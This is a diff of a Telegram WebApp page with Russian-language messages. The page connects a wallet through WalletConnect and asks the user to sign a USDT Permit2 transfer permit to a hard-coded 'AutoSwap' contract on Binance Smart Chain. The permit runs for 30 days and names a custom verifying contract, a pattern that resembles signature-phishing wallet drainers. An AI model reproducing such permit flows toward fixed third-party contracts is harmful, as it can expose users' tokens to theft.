@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>WalletConnect v2 Permit2 + AutoSwap</title>
 
-<!-- Telegram WebApp SDK -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <style>
@@ -39,7 +38,6 @@
   const tg = window.Telegram?.WebApp;
   tg?.ready();
 
-  // Константы
   const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
   const PERMIT2_CONTRACT = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
   const AUTOSWAP_CONTRACT = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
@@ -84,9 +82,14 @@
 
       modal.close();
 
+      accountSpan.textContent = accounts[0] || "Нет аккаунтов";
+      chainSpan.textContent = parseInt(chainId, 16);
+
+      walletInfo.style.display = "block";
+
       if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
         statusDiv.style.color = "#ffa726";
-        statusDiv.textContent = `⚠️ Пожалуйста, переключитесь на Binance Smart Chain (chainId: ${BSC_CHAIN_ID}) в кошельке`;
+        statusDiv.textContent = `⚠️ Переключитесь на сеть Binance Smart Chain (chainId: ${BSC_CHAIN_ID}) в кошельке`;
         swapBtn.disabled = true;
       } else {
         statusDiv.style.color = "white";
@@ -94,18 +97,17 @@
         swapBtn.disabled = false;
       }
 
-      accountSpan.textContent = accounts[0];
-      chainSpan.textContent = parseInt(chainId, 16);
-      walletInfo.style.display = "block";
-
+      // Обработчики изменений аккаунтов и сети
       provider.on("accountsChanged", (newAccounts) => {
         accounts = newAccounts;
         accountSpan.textContent = accounts[0] || "Нет аккаунтов";
+        console.log("Accounts changed:", accounts);
       });
 
       provider.on("chainChanged", (newChainId) => {
         chainId = newChainId;
         chainSpan.textContent = parseInt(chainId, 16);
+        console.log("Chain changed:", chainId);
         if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
           statusDiv.style.color = "#ffa726";
           statusDiv.textContent = `⚠️ Смените сеть на Binance Smart Chain (${BSC_CHAIN_ID})`;
@@ -118,71 +120,72 @@
 
     } catch (e) {
       statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Ошибка подключения WalletConnect: " + e.message;
+      statusDiv.textContent = "Ошибка подключения WalletConnect: " + (e.message || e);
       console.error(e);
+      swapBtn.disabled = true;
     }
   }
 
   async function doSwap() {
-    if (!provider || accounts.length === 0) {
-      statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Сначала подключите кошелек.";
-      return;
-    }
-    if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
-      statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Неправильная сеть. Используйте Binance Smart Chain.";
-      return;
-    }
-    const owner = accounts[0];
-    const amountStr = amountInput.value.trim();
-    if (!amountStr || !/^\d+$/.test(amountStr)) {
-      statusDiv.style.color = "#e64a45";
-      statusDiv.textContent = "Введите корректную сумму в минимальных единицах (целое число).";
-      return;
-    }
-    const amount = amountStr;
-
-    statusDiv.style.color = "white";
-    statusDiv.textContent = "Генерируем подпись Permit2...";
-
-    const nonce = Date.now();
-    const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600;
-
-    const domain = {
-      name: "Permit2",
-      chainId: BSC_CHAIN_ID,
-      verifyingContract: PERMIT2_CONTRACT,
-    };
-
-    const types = {
-      PermitTransferFrom: [
-        { name: "permitted", type: "TokenPermissions" },
-        { name: "spender", type: "address" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" },
-      ],
-      TokenPermissions: [
-        { name: "token", type: "address" },
-        { name: "amount", type: "uint256" },
-      ],
-    };
-
-    const message = {
-      permitted: { token: USDT_TOKEN, amount: amount },
-      spender: AUTOSWAP_CONTRACT,
-      nonce: nonce,
-      deadline: deadline,
-    };
-
-    const typedData = {
-      types,
-      domain,
-      primaryType: "PermitTransferFrom",
-      message,
-    };
-
     try {
+      if (!provider || accounts.length === 0) {
+        statusDiv.style.color = "#e64a45";
+        statusDiv.textContent = "Сначала подключите кошелек.";
+        return;
+      }
+      if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
+        statusDiv.style.color = "#e64a45";
+        statusDiv.textContent = "Неправильная сеть. Используйте Binance Smart Chain.";
+        return;
+      }
+      const owner = accounts[0];
+      const amountStr = amountInput.value.trim();
+      if (!amountStr || !/^\d+$/.test(amountStr)) {
+        statusDiv.style.color = "#e64a45";
+        statusDiv.textContent = "Введите корректную сумму в минимальных единицах (целое число).";
+        return;
+      }
+      const amount = amountStr;
+
+      statusDiv.style.color = "white";
+      statusDiv.textContent = "Генерируем подпись Permit2...";
+
+      const nonce = Date.now();
+      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 3600;
+
+      const domain = {
+        name: "Permit2",
+        chainId: BSC_CHAIN_ID,
+        verifyingContract: PERMIT2_CONTRACT,
+      };
+
+      const types = {
+        PermitTransferFrom: [
+          { name: "permitted", type: "TokenPermissions" },
+          { name: "spender", type: "address" },
+          { name: "nonce", type: "uint256" },
+          { name: "deadline", type: "uint256" },
+        ],
+        TokenPermissions: [
+          { name: "token", type: "address" },
+          { name: "amount", type: "uint256" },
+        ],
+      };
+
+      const message = {
+        permitted: { token: USDT_TOKEN, amount: amount },
+        spender: AUTOSWAP_CONTRACT,
+        nonce: nonce,
+        deadline: deadline,
+      };
+
+      const typedData = {
+        types,
+        domain,
+        primaryType: "PermitTransferFrom",
+        message,
+      };
+
       const signature = await provider.request({
         method: "eth_signTypedData_v4",
         params: [owner, JSON.stringify(typedData)],
@@ -214,7 +217,7 @@
       });
 
       statusDiv.style.color = "#66bb6a";
-      statusDiv.textContent = "✅ Транзакция отправлена! Tx Hash: " + txHash;
+      statusDiv.textContent = "Транзакция отправлена! TxHash: " + txHash;
 
     } catch (err) {
       statusDiv.style.color = "#e64a45";
